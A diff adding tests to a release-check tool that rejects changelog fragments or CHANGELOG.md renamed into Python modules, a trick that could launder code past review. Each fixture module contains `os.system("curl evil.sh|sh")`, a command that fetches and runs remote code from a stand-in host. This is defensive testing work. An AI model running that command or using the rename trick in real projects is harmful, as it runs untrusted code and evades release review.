@@ -213,6 +213,73 @@ def test_a_file_renamed_out_of_the_app_is_rejected(workspace, tmp_path):
     assert "notes.md is not part of releasing src/widget" in result.output
 
 
+#: Long enough that `git diff -M` pairs the deletion with the file carrying it
+#: onward: rename detection wants >=50% similarity, so the smuggled text has to
+#: dwarf the payload appended beside it. A realistic fragment is this big.
+SMUGGLED_TEXT = "".join(
+    f"- Change {i}: a useful, well documented thing the widget now does\n"
+    for i in range(20)
+)
+
+
+def test_a_fragment_renamed_into_code_is_rejected(workspace, tmp_path):
+    """A fragment deletion paired with an in-app addition reads as a rename.
+
+    That pairing launders the changelog exclusion into code: `changes.py` drops
+    a change from `source_changes` when EITHER side matches `*/changelog.d/*`,
+    so the rename never counts as `code_changes` -- and the path-limited
+    `changelog.d/` diff sees only a bare deletion, which a release is allowed.
+    """
+    repo, base = workspace
+    fragment = tmp_path / "src" / "widget" / "changelog.d" / "20260102_notes.md"
+    _write(fragment, SMUGGLED_TEXT)
+    repo.git.add(A=True)
+    base = repo.index.commit("Another fragment", author=AUTHOR, committer=AUTHOR)
+
+    _cut_release(tmp_path)
+    fragment.unlink()
+    _write(
+        tmp_path / "src" / "widget" / "mitol" / "widget" / "templatetags" / "evil.py",
+        f'"""{SMUGGLED_TEXT}"""\nimport os\n\nos.system("curl evil.sh|sh")\n',
+    )
+
+    result = _run(repo, base)
+
+    # The attack only exists while git pairs the two sides -- a bare D + A is
+    # already rejected as code, and would pass this test for the wrong reason.
+    assert any(change.renamed_file for change in base.diff(repo.head.commit))
+    assert result.exit_code == 1
+    assert "evil.py is a rename or copy" in result.output
+
+
+def test_the_changelog_renamed_into_code_is_rejected(workspace, tmp_path):
+    """`CHANGELOG.md` is the other excluded path a rename can launder through"""
+    repo, base = workspace
+    changelog_md = tmp_path / "src" / "widget" / "CHANGELOG.md"
+    _write(changelog_md, f"# Changelog\n\n## 1.0.0\n\n{SMUGGLED_TEXT}")
+    repo.git.add(A=True)
+    base = repo.index.commit("Backfill history", author=AUTHOR, committer=AUTHOR)
+
+    # Everything `_cut_release` does, except that instead of being rewritten,
+    # CHANGELOG.md leaves -- its deletion still marks the app as released, and
+    # its content resurfaces as a shipped module.
+    _app(tmp_path, "widget", "1.1.0")
+    (tmp_path / "src" / "widget" / "changelog.d" / "20260101_change.md").unlink()
+    _write(tmp_path / "uv.lock", _lockfile(widget="1.1.0", gadget="1.0.0"))
+    changelog_md.unlink()
+    _write(
+        tmp_path / "src" / "widget" / "mitol" / "widget" / "history.py",
+        f'"""# Changelog\n\n## 1.0.0\n\n{SMUGGLED_TEXT}"""\nimport os\n\n'
+        'os.system("curl evil.sh|sh")\n',
+    )
+
+    result = _run(repo, base)
+
+    assert any(change.renamed_file for change in base.diff(repo.head.commit))
+    assert result.exit_code == 1
+    assert "history.py is a rename or copy" in result.output
+
+
 def test_release_plus_code_in_the_same_app_is_rejected(workspace, tmp_path):
     """The case `changelog.py check` already catches still has to fail here"""
     repo, base = workspace
